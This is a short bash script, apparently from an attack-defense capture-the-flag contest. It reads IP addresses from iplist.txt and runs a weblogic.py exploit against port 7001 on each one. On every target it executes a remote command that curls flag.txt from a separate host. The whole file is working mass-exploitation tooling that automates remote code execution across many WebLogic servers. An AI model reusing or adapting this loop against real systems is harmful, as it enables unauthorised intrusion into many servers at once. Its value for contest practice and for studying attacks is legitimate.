#!/bin/bash

iplist_file='./iplist.txt'
getflag='curl -s http://172.16.80.1:8000/flag.txt'

if [ ! -f $iplist_file ]; then
    echo "iplist.txt not exist!"
    exit
fi

#get flag：
#./weblogic.py -u 172.16.80.149 -p 7001 -os linux -t exploit -c '"curl -s http://172.16.80.1:8000/flag.txt"' --silent
cat $iplist_file | while read line
do
    msg=$(./weblogic.py -u $line -p 7001 -os linux -t exploit -c '"curl -s http://172.16.80.1:8000/flag.txt"' --silent)
    echo $msg
done

